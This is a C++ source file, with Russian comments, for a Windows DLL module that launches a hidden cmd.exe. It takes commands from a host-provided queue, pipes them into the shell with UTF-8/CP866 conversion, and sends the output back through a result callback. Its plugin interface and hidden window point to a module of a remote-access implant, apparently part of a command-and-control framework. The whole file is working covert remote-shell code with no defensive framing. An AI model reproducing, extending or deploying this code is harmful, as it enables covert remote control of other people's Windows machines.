// Modules/Shell/shell.cpp — SYMMETRICAL ENCODING FIX
// Компиляция: cl /LD /MT /O2 shell.cpp /Fe:shell.dll kernel32.lib user32.lib

#include <windows.h>
#include <stdio.h>
#include <string.h>

struct ModuleAPI {
    void (*send_result)(const unsigned char* data, unsigned long long len);
    void (*log)(const char* msg);
    const char* (*get_command)(const char* key);
};

// Глобальное состояние
static volatile bool g_running = true;
static volatile bool g_shell_active = false;
static CRITICAL_SECTION g_cs;
static HANDLE g_hInputWrite = NULL;
static HANDLE g_hOutputRead = NULL;
static HANDLE g_hProcess = NULL;
static HANDLE g_hReadThread = NULL;
static HANDLE g_hWriteThread = NULL;

// Копии API-указателей
static void (*g_send_result)(const unsigned char*, unsigned long long) = nullptr;
static void (*g_log)(const char*) = nullptr;
static const char* (*g_get_command)(const char*) = nullptr;

// Хелпер для логов
void sh_log(const char* msg) {
    CreateDirectoryA("C:\\temp", NULL);
    HANDLE h = CreateFileA("C:\\temp\\shell.log", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h != INVALID_HANDLE_VALUE) {
        SetFilePointer(h, 0, NULL, FILE_END);
        DWORD w; WriteFile(h, msg, (DWORD)strlen(msg), &w, NULL);
        CloseHandle(h);
    }
    if (g_log) g_log(msg);
}

// Конвертация: OEM (CP866) -> UTF-8 (для ВЫВОДА)
char* oem_to_utf8(const char* oem_str) {
    if (!oem_str) return NULL;
    int wlen = MultiByteToWideChar(CP_OEMCP, 0, oem_str, -1, NULL, 0);
    if (wlen <= 0) return NULL;
    wchar_t* wstr = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, wlen * sizeof(wchar_t));
    if (!wstr) return NULL;
    MultiByteToWideChar(CP_OEMCP, 0, oem_str, -1, wstr, wlen);
    
    int utflen = WideCharToMultiByte(CP_UTF8, 0, wstr, -1, NULL, 0, NULL, NULL);
    if (utflen <= 0) { HeapFree(GetProcessHeap(), 0, wstr); return NULL; }
    char* utf8_str = (char*)HeapAlloc(GetProcessHeap(), 0, utflen);
    if (utf8_str) WideCharToMultiByte(CP_UTF8, 0, wstr, -1, utf8_str, utflen, NULL, NULL);
    HeapFree(GetProcessHeap(), 0, wstr);
    return utf8_str;
}

// Конвертация: UTF-8 -> OEM (CP866) (для ВВОДА)
char* utf8_to_oem(const char* utf8_str) {
    if (!utf8_str) return NULL;
    int wlen = MultiByteToWideChar(CP_UTF8, 0, utf8_str, -1, NULL, 0);
    if (wlen <= 0) return NULL;
    wchar_t* wstr = (wchar_t*)HeapAlloc(GetProcessHeap(), 0, wlen * sizeof(wchar_t));
    if (!wstr) return NULL;
    MultiByteToWideChar(CP_UTF8, 0, utf8_str, -1, wstr, wlen);
    
    int olen = WideCharToMultiByte(CP_OEMCP, 0, wstr, -1, NULL, 0, NULL, NULL);
    if (olen <= 0) { HeapFree(GetProcessHeap(), 0, wstr); return NULL; }
    char* oem_str = (char*)HeapAlloc(GetProcessHeap(), 0, olen);
    if (oem_str) WideCharToMultiByte(CP_OEMCP, 0, wstr, -1, oem_str, olen, NULL, NULL);
    HeapFree(GetProcessHeap(), 0, wstr);
    return oem_str;
}

// Умная отправка
void send_smart(const char* prefix, const char* data, int data_len) {
    const int CHUNK_THRESHOLD = 1024;
    if (data_len <= CHUNK_THRESHOLD) {
        int total_len = (int)strlen(prefix) + data_len + 1;
        unsigned char* out = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, total_len);
        if (out) {
            memcpy(out, prefix, strlen(prefix));
            memcpy(out + strlen(prefix), data, data_len);
            out[total_len - 1] = '\n';
            g_send_result(out, total_len);
            HeapFree(GetProcessHeap(), 0, out);
        }
        return;
    }
    int chunk_num = 0, total_chunks = 0, line_start = 0;
    for (int i = 0; i < data_len; i++) if (data[i] == '\n') total_chunks++;
    if (total_chunks == 0) total_chunks = 1;
    
    for (int i = 0; i <= data_len; i++) {
        if (i == data_len || data[i] == '\n') {
            int line_len = i - line_start + 1;
            char header[64];
            sprintf_s(header, "%s#%d/%d:", prefix, chunk_num, total_chunks);
            int header_len = (int)strlen(header);
            int total_len = header_len + line_len;
            unsigned char* out = (unsigned char*)HeapAlloc(GetProcessHeap(), 0, total_len);
            if (out) {
                memcpy(out, header, header_len);
                memcpy(out + header_len, data + line_start, line_len);
                g_send_result(out, total_len);
                HeapFree(GetProcessHeap(), 0, out);
            }
            line_start = i + 1;
            chunk_num++;
            Sleep(5);
        }
    }
}

// Поток чтения вывода
DWORD WINAPI ReadThread(LPVOID) {
    char buffer[4096];
    DWORD read;
    sh_log("SHELL: ReadThread started\n");
    while (g_running && g_shell_active) {
        if (WaitForSingleObject(g_hOutputRead, 100) == WAIT_OBJECT_0) {
            if (ReadFile(g_hOutputRead, buffer, sizeof(buffer) - 1, &read, NULL) && read > 0) {
                buffer[read] = '\0';
                char* utf8_data = oem_to_utf8(buffer);
                if (utf8_data) {
                    send_smart("SHELL_OUT", utf8_data, (int)strlen(utf8_data));
                    HeapFree(GetProcessHeap(), 0, utf8_data);
                } else {
                    send_smart("SHELL_OUT", buffer, (int)read);
                }
            } else {
                if (GetLastError() != ERROR_BROKEN_PIPE) {
                    char err_msg[64];
                    sprintf_s(err_msg, "SHELL: ReadFile failed (Err:%lu)\n", GetLastError());
                    sh_log(err_msg);
                }
                break;
            }
        }
    }
    sh_log("SHELL: ReadThread stopped\n");
    return 0;
}

// Поток записи команд
DWORD WINAPI WriteThread(LPVOID) {
    sh_log("SHELL: WriteThread started\n");
    while (g_running && g_shell_active) {
        if (g_get_command) {
            const char* cmd = g_get_command("shell");
            if (cmd && strlen(cmd) > 0) {
                sh_log("SHELL: Got command from queue\n");
                if (strstr(cmd, "shell_stop")) {
                    g_shell_active = false;
                    sh_log("SHELL: Stop command received\n");
                    break;
                } else if (strstr(cmd, "shell_exec:")) {
                    const char* exec_cmd = strstr(cmd, "shell_exec:") + 11;
                    if (g_hInputWrite && strlen(exec_cmd) > 0) {
                        DWORD written;
                        char full_cmd[2048];
                        
                        // ФИКС: Конвертируем UTF-8 -> CP866 перед записью в пайп
                        char* oem_cmd = utf8_to_oem(exec_cmd);
                        if (oem_cmd) {
                            sprintf_s(full_cmd, "%s\r\n", oem_cmd);
                            HeapFree(GetProcessHeap(), 0, oem_cmd);
                        } else {
                            // Фоллбэк, если конвертация не удалась
                            sprintf_s(full_cmd, "%s\r\n", exec_cmd);
                        }
                        
                        if (!WriteFile(g_hInputWrite, full_cmd, (DWORD)strlen(full_cmd), &written, NULL)) {
                            char err_msg[64];
                            sprintf_s(err_msg, "SHELL: WriteFile failed (Err:%lu)\n", GetLastError());
                            sh_log(err_msg);
                        } else {
                            FlushFileBuffers(g_hInputWrite);
                            sh_log("SHELL: Command sent to pipe (Converted to OEM)\n");
                        }
                    }
                }
            }
        }
        Sleep(50);
    }
    sh_log("SHELL: WriteThread stopped\n");
    return 0;
}

// Запуск скрытого cmd.exe
bool start_shell() {
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };
    HANDLE hInputRead, hOutputWrite;
    if (!CreatePipe(&hInputRead, &g_hInputWrite, &sa, 0) ||
        !CreatePipe(&g_hOutputRead, &hOutputWrite, &sa, 0)) {
        sh_log("SHELL: Failed to create pipes\n");
        return false;
    }
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput = hInputRead;
    si.hStdOutput = hOutputWrite;
    si.hStdError = hOutputWrite;
    PROCESS_INFORMATION pi = { 0 };
    
    // Убрали chcp 65001. CMD работает в родном OEM. Мы конвертируем на лету.
    if (!CreateProcessA(NULL, "cmd.exe /k", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        sh_log("SHELL: Failed to start cmd.exe\n");
        CloseHandle(hInputRead); CloseHandle(g_hInputWrite);
        CloseHandle(g_hOutputRead); CloseHandle(hOutputWrite);
        return false;
    }
    CloseHandle(hInputRead);
    CloseHandle(hOutputWrite);
    CloseHandle(pi.hThread);
    g_hProcess = pi.hProcess;
    g_shell_active = true;
    g_hReadThread = CreateThread(NULL, 0, ReadThread, NULL, 0, NULL);
    g_hWriteThread = CreateThread(NULL, 0, WriteThread, NULL, 0, NULL);
    sh_log("SHELL: Started successfully (Symmetric Encoding)\n");
    return true;
}

// Остановка шелла
void stop_shell() {
    g_shell_active = false;
    if (g_hProcess && WaitForSingleObject(g_hProcess, 100) == WAIT_TIMEOUT) TerminateProcess(g_hProcess, 0);
    if (g_hReadThread) WaitForSingleObject(g_hReadThread, 2000);
    if (g_hWriteThread) WaitForSingleObject(g_hWriteThread, 2000);
    if (g_hInputWrite) CloseHandle(g_hInputWrite);
    if (g_hOutputRead) CloseHandle(g_hOutputRead);
    if (g_hProcess) CloseHandle(g_hProcess);
    if (g_hReadThread) CloseHandle(g_hReadThread);
    if (g_hWriteThread) CloseHandle(g_hWriteThread);
    g_hInputWrite = g_hOutputRead = g_hProcess = NULL;
    g_hReadThread = g_hWriteThread = NULL;
    sh_log("SHELL: Stopped and cleaned up\n");
}

// Точка входа
extern "C" __declspec(dllexport) int __stdcall Run(ModuleAPI* api) {
    if (!api || !api->send_result) return -1;
    g_send_result = api->send_result;
    g_log = api->log;
    g_get_command = api->get_command;
    InitializeCriticalSection(&g_cs);
    if (!start_shell()) {
        api->send_result((const unsigned char*)"SHELL_ERROR:Failed to start\n", 27);
        DeleteCriticalSection(&g_cs);
        return -1;
    }
    api->send_result((const unsigned char*)"SHELL_READY:Interactive shell started (Symmetric UTF8/OEM)\n", 57);
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    if (ul_reason_for_call == DLL_PROCESS_ATTACH) sh_log("SHELL: DLL_ATTACH\n");
    if (ul_reason_for_call == DLL_PROCESS_DETACH) {
        sh_log("SHELL: DLL_DETACH, stopping...\n");
        g_running = false;
        stop_shell();
        DeleteCriticalSection(&g_cs);
    }
    return TRUE;
}